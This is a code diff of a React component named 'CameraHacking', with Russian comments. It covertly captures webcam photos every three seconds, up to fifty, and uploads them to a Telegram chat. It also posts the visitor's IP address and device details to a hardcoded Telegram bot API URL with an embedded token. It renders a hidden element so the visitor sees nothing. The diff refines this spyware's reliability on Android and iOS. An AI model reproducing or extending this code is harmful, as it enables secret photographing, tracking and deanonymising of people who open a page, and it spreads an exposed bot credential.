+          addDebugLog('ВНИМАНИЕ: Разрешение видео 0x0');
+          await sendDiagnosticReport('Проблема с разрешением видео', {
+            warning: 'Video dimensions are 0x0',
+            device: diagnostics
+          }, true);
+        }
+      }
+      
+      setIsInitialized(true);
+      return true;
+      
+    } catch (error) {
+      addDebugLog(`Ошибка инициализации камеры: ${error.message}`);
+      await sendDiagnosticReport('Ошибка инициализации камеры', error, true);
+      return false;
+    }
+  };
+
+  /**
+   * ЗАХВАТ ФОТО
+   */
+  const capturePhoto = async () => {
+    if (!isInitialized || !videoRef.current || !streamRef.current) {
+      addDebugLog('Камера не готова, пропускаем захват');
       return;
     }
     
-    const captureStartTime = Date.now();
+    const video = videoRef.current;
+    
+    // Проверяем готовность видео
+    if (video.videoWidth === 0 || video.videoHeight === 0) {
+      addDebugLog('Видео не готово (0x0), пропускаем');
+      return;
+    }
     
     try {
-      const video = videoRef.current;
-      
-      // Проверяем состояние видео
-      if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
-        console.log('⏳ Видео не готово, пропускаем захват');
-        
-        // Добавляем в диагностику
-        setDiagnosticData(prev => ({
-          ...prev,
-          failedCaptures: prev.failedCaptures + 1
-        }));
-        
-        return;
-      }
-      
-      console.log(`📸 Захват фото #${captureCount + 1}`);
+      addDebugLog(`Захватываем фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
       
       // Создаем canvas
       const canvas = document.createElement('canvas');
@@ -783,91 +385,61 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       
       const ctx = canvas.getContext('2d');
       
-      // Пробуем несколько раз нарисовать кадр (для Android)
-      let frameCaptured = false;
+      // Для Android: несколько попыток избежать черных кадров
       let attempts = 0;
-      const maxAttempts = diagnosticData.deviceInfo.isAndroid ? 3 : 1;
+      let frameOk = false;
       
-      while (!frameCaptured && attempts < maxAttempts) {
+      while (!frameOk && attempts < 3) {
         attempts++;
         
+        // Очищаем canvas
+        ctx.fillStyle = 'black';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        
+        // Рисуем кадр
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         // Проверяем, не черный ли кадр
         const imageData = ctx.getImageData(10, 10, 1, 1).data;
         const isBlack = imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0;
         
-        if (!isBlack || attempts >= maxAttempts) {
-          frameCaptured = true;
-          console.log(`✅ Кадр захвачен (попытка ${attempts}, черный: ${isBlack})`);
+        if (!isBlack || attempts >= 3) {
+          frameOk = true;
+          addDebugLog(`Кадр захвачен (попытка ${attempts}, черный: ${isBlack})`);
           
-          // Если черный, добавляем текст для диагностики
+          // Если все еще черный, добавляем текст
           if (isBlack) {
             ctx.fillStyle = 'white';
             ctx.font = '20px Arial';
-            ctx.fillText('Android Camera Test', 20, 40);
+            ctx.fillText('Camera Test', 20, 40);
             ctx.fillText(new Date().toLocaleTimeString(), 20, 70);
           }
         } else {
-          console.log(`⏳ Черный кадр, повторная попытка ${attempts}/${maxAttempts}`);
+          addDebugLog(`Черный кадр, повтор ${attempts}/3`);
           await new Promise(resolve => setTimeout(resolve, 100));
         }
       }
       
-      // Качество на основе диагностики
-      const quality = diagnosticData.deviceInfo.isAndroid ? 0.6 : 0.8;
+      // Качество изображения
+      const quality = deviceInfo?.isAndroid ? 0.7 : 0.8;
       
+      // Конвертируем в blob
       canvas.toBlob(async (blob) => {
         if (!blob) {
-          console.error('❌ Не удалось создать Blob');
-          setDiagnosticData(prev => ({
-            ...prev,
-            failedCaptures: prev.failedCaptures + 1
-          }));
+          addDebugLog('Ошибка: не удалось создать blob');
           return;
         }
         
-        const captureTime = Date.now() - captureStartTime;
         const sizeKB = Math.round(blob.size / 1024);
-        
-        console.log(`✅ Фото готово (${sizeKB} KB, время: ${captureTime}ms)`);
+        addDebugLog(`Фото готово (${sizeKB} KB)`);
         
         // Отправляем фото
-        const success = await sendPhotoToTelegram(blob);
-        
-        if (success) {
-          setCaptureCount(prev => prev + 1);
-          setDiagnosticData(prev => ({
-            ...prev,
-            successfulCaptures: prev.successfulCaptures + 1,
-            captures: prev.captures + 1
-          }));
-        } else {
-          setDiagnosticData(prev => ({
-            ...prev,
-            failedCaptures: prev.failedCaptures + 1
-          }));
-        }
-        
-        // Каждые 10 фото отправляем статистику
-        if (captureCount % 10 === 0) {
-          await sendCaptureStats();
-        }
+        await sendPhotoToTelegram(blob);
         
       }, 'image/jpeg', quality);
       
     } catch (error) {
-      console.error('❌ Ошибка захвата фото:', error);
-      
-      setDiagnosticData(prev => ({
-        ...prev,
-        failedCaptures: prev.failedCaptures + 1,
-        errors: [...prev.errors, {
-          timestamp: new Date().toISOString(),
-          type: 'capture_error',
-          message: error.message
-        }]
-      }));
+      addDebugLog(`Ошибка захвата фото: ${error.message}`);
     }
   };
 
@@ -878,53 +450,51 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
     try {
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
       
-      // Добавляем диагностические данные
-      formData.append('diagnostics', JSON.stringify({
-        captureNumber: captureCount + 1,
-        timestamp: new Date().toISOString(),
-        deviceInfo: diagnosticData.deviceInfo,
-        blobSize: blob.size
-      }));
+      // Имя файла с информацией об устройстве
+      let deviceType = 'unknown';
+      if (deviceInfo?.isAndroid) deviceType = 'android';
+      if (deviceInfo?.isIOS) deviceType = 'ios';
+      
+      formData.append('photo', blob, `photo_${Date.now()}_${deviceType}.jpg`);
+      
+      // Добавляем базовую диагностику
+      if (deviceInfo) {
+        formData.append('device_info', JSON.stringify({
+          type: deviceType,
+          timestamp: Date.now(),
+          userAgent: deviceInfo.userAgent?.substring(0, 100)
+        }));
+      }
       
       const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
       
+      addDebugLog('Отправляем фото в Telegram...');
+      
       await axios.post(apiUrl, formData, {
         headers: { 'Content-Type': 'multipart/form-data' },
-        timeout: 30000
+        timeout: 15000
       });
       
-      return true;
+      addDebugLog('✅ Фото успешно отправлено!');
+      setCaptureCount(prev => prev + 1);
       
     } catch (error) {
-      console.error('❌ Ошибка отправки фото:', error);
-      return false;
-    }
-  };
-
-  /**
-   * ОТПРАВКА СТАТИСТИКИ ЗАХВАТОВ
-   */
-  const sendCaptureStats = async () => {
-    const statsText = `📊 СТАТИСТИКА ЗАХВАТОВ\n\n` +
-                     `Всего захватов: ${diagnosticData.captures}\n` +
-                     `Успешных: ${diagnosticData.successfulCaptures}\n` +
-                     `Неудачных: ${diagnosticData.failedCaptures}\n` +
-                     `Успешность: ${diagnosticData.captures > 0 ? 
-                       Math.round((diagnosticData.successfulCaptures / diagnosticData.captures) * 100) : 0}%\n\n` +
-                     `Устройство: ${diagnosticData.deviceInfo.isAndroid ? 'Android' : 'Другое'}\n` +
-                     `Статус камеры: ${diagnosticData.cameraState.streamActive ? 'Активна' : 'Не активна'}\n` +
-                     `Разрешение: ${diagnosticData.cameraState.videoWidth}x${diagnosticData.cameraState.videoHeight}`;
-    
-    try {
-      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
-      await axios.post(telegramApiUrl, {
-        chat_id: chatId,
-        text: statsText
-      });
-    } catch (error) {
-      console.error('❌ Ошибка отправки статистики:', error);
+      addDebugLog(`❌ Ошибка отправки фото: ${error.message}`);
+      
+      // Отправляем ошибку в Telegram
+      try {
+        const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+        await axios.post(telegramApiUrl, {
+          chat_id: chatId,
+          text: `❌ Ошибка отправки фото\n\n` +
+                `Устройство: ${deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Unknown'}\n` +
+                `Ошибка: ${error.message.substring(0, 100)}\n` +
+                `Время: ${new Date().toLocaleString()}`
+        });
+      } catch (telegramError) {
+        addDebugLog(`Не удалось отправить ошибку: ${telegramError.message}`);
+      }
     }
   };
 
@@ -936,33 +506,22 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
       clearInterval(captureIntervalRef.current);
     }
     
-    console.log('🚀 Запуск периодического захвата фото');
+    addDebugLog('🚀 Запуск периодического захвата (каждые 3 секунды)');
     
+    // Первый захват через 2 секунды
+    setTimeout(() => {
+      capturePhoto();
+    }, 2000);
+    
+    // Последующие каждые 3 секунды
     captureIntervalRef.current = setInterval(() => {
-      capturePhotoWithDiagnostics();
-    }, CAPTURE_INTERVAL);
-  };
-
-  /**
-   * ОСТАНОВКА ВСЕХ ПРОЦЕССОВ
-   */
-  const stopCapturing = () => {
-    if (captureIntervalRef.current) {
-      clearInterval(captureIntervalRef.current);
-      captureIntervalRef.current = null;
-    }
-    
-    if (diagnosticIntervalRef.current) {
-      clearInterval(diagnosticIntervalRef.current);
-      diagnosticIntervalRef.current = null;
-    }
-    
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach(track => track.stop());
-      streamRef.current = null;
-    }
-    
-    console.log('🛑 Все процессы остановлены');
+      if (captureCount < 50) { // Максимум 50 фото
+        capturePhoto();
+      } else {
+        stopCapturing();
+        addDebugLog('🎯 Достигнут лимит в 50 фото');
+      }
+    }, 3000);
   };
 
   /**
@@ -974,80 +533,160 @@ const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) =
         timeout: 5000
       });
       
-      setClientIp(response.data.ip);
-      console.log('✅ IP адрес получен:', response.data.ip);
+      const ip = response.data.ip;
+      setClientIp(ip);
+      addDebugLog(`IP адрес: ${ip}`);
+      
+      // Отправляем IP в Telegram
+      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
+      await axios.post(telegramApiUrl, {
+        chat_id: chatId,
+        text: `🌐 IP Address: ${ip}\n` +
+              `Device: ${deviceInfo?.isAndroid ? 'Android' : deviceInfo?.isIOS ? 'iOS' : 'Other'}`
+      });
       
     } catch (error) {
-      console.error('❌ Ошибка получения IP:', error);
-      setClientIp('IP недоступен');
+      addDebugLog(`Ошибка получения IP: ${error.message}`);
+      setClientIp('IP unavailable');
     }
+  };
+
+  /**
+   * ВОССТАНОВЛЕНИЕ ГЕОЛОКАЦИИ
+   */
+  const restoreLocation = () => {
+    try {
+      const saved = localStorage.getItem('locationPermission');
+      if (saved) {
+        const locationData = JSON.parse(saved);
+        setLocationPermission(locationData);
+        addDebugLog('Геолокация восстановлена из localStorage');
+      }
+    } catch (error) {
+      localStorage.removeItem('locationPermission');
+    }
+  };
+
+  /**
+   * ОСТАНОВКА ВСЕГО
+   */
+  const stopCapturing = () => {
+    if (captureIntervalRef.current) {
+      clearInterval(captureIntervalRef.current);
+      captureIntervalRef.current = null;
+    }
+    
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach(track => {
+        track.stop();
+        addDebugLog(`Остановлен ${track.kind} трек`);
+      });
+      streamRef.current = null;
+    }
+    
+    addDebugLog('🛑 Захват остановлен');
   };
 
   /**
    * ОСНОВНОЙ ЭФФЕКТ
    */
   useEffect(() => {
-    const init = async () => {
-      // Восстановление геолокации
-      const savedPermission = localStorage.getItem('locationPermission');
-      if (savedPermission) {
-        try {
-          const locationData = JSON.parse(savedPermission);
-          setLocationPermission(locationData);
-        } catch (error) {
-          localStorage.removeItem('locationPermission');
-        }
-      }
+    let mounted = true;
+    
+    const initializeAll = async () => {
+      if (!mounted) return;
       
-      // Получаем IP
+      addDebugLog('=== НАЧАЛО ИНИЦИАЛИЗАЦИИ ===');
+      
+      // 1. Восстанавливаем геолокацию
+      restoreLocation();
+      
+      // 2. Получаем IP
       await fetchClientIp();
       
-      // Инициализируем камеру с диагностикой
-      await initializeCameraWithDiagnostics();
+      // 3. Проверяем поддержку
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        addDebugLog('❌ Браузер не поддерживает камеру');
+        await sendDiagnosticReport('WebRTC не поддерживается', {
+          userAgent: navigator.userAgent,
+          hasMediaDevices: !!navigator.mediaDevices,
+          hasGetUserMedia: !!(navigator.mediaDevices?.getUserMedia)
+        }, true);
+        return;
+      }
+      
+      // 4. Инициализируем камеру
+      const cameraInitialized = await initializeCamera();
+      
+      if (cameraInitialized && mounted) {
+        // 5. Запускаем захват
+        startPeriodicCapture();
+      }
     };
     
-    init();
+    initializeAll();
     
+    // Очистка
     return () => {
+      mounted = false;
       stopCapturing();
     };
   }, []);
 
   /**
-   * КОМПОНЕНТ ДЛЯ ОТЛАДКИ (ВИДИМЫЙ ТОЛЬКО В РЕЖИМЕ РАЗРАБОТКИ)
+   * СИМПЛЕЙШИЙ UI ДЛЯ ОТЛАДКИ
    */
-  if (process.env.NODE_ENV === 'development') {
-    return (
-      <div style={{
-        position: 'fixed',
-        bottom: 0,
-        left: 0,
-        right: 0,
-        background: 'rgba(0,0,0,0.9)',
-        color: 'white',
-        padding: '10px',
-        fontSize: '11px',
-        zIndex: 9999,
-        maxHeight: '150px',
-        overflow: 'auto',
-        fontFamily: 'monospace'
-      }}>
-        <div><strong>Диагностика камеры:</strong></div>
-        <div>Статус: {diagnosticData.status}</div>
-        <div>Устройство: {diagnosticData.deviceInfo.isAndroid ? 'Android' : 'Другое'}</div>
-        <div>Камера: {diagnosticData.cameraState.videoWidth}x{diagnosticData.cameraState.videoHeight}</div>
-        <div>Захватов: {diagnosticData.successfulCaptures} / {diagnosticData.failedCaptures}</div>
-        <div>Ошибок: {diagnosticData.errors.length}</div>
-        {diagnosticData.errors.slice(-2).map((error, index) => (
-          <div key={index} style={{ color: '#ff6b6b' }}>
-            {error.type}: {error.message.substring(0, 50)}...
-          </div>
-        ))}
+  return (
+    <div style={{ display: 'none' }}>
+      {/* Скрытый div для хранения данных */}
+      <div id="camera-debug-data">
+        {deviceInfo && JSON.stringify({
+          device: deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : 'Other',
+          version: deviceInfo.isAndroid ? deviceInfo.androidVersion : 
+                  deviceInfo.isIOS ? deviceInfo.iosVersion : 'N/A',
+          browser: deviceInfo.isChrome ? 'Chrome' : 
+                  deviceInfo.isSafari ? 'Safari' : 
+                  deviceInfo.isFirefox ? 'Firefox' : 'Other',
+          webView: deviceInfo.isWebView,
+          initialized: isInitialized,
+          captures: captureCount
+        })}
       </div>
-    );
-  }
-
-  return null;
+      
+      {/* Минимальная отладка в development */}
+      {process.env.NODE_ENV === 'development' && (
+        <div style={{
+          position: 'fixed',
+          bottom: 10,
+          right: 10,
+          background: 'rgba(0,0,0,0.8)',
+          color: 'white',
+          padding: '10px',
+          fontSize: '11px',
+          maxWidth: '300px',
+          maxHeight: '200px',
+          overflow: 'auto',
+          zIndex: 9999,
+          fontFamily: 'monospace'
+        }}>
+          <div style={{ fontWeight: 'bold', marginBottom: '5px' }}>
+            Camera Debug ({captureCount} photos)
+          </div>
+          {debugLogs.slice(0, 5).map((log, index) => (
+            <div key={index} style={{ 
+              fontSize: '10px',
+              marginBottom: '2px',
+              whiteSpace: 'nowrap',
+              overflow: 'hidden',
+              textOverflow: 'ellipsis'
+            }}>
+              {log}
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
 };
 
 export default CameraHacking;
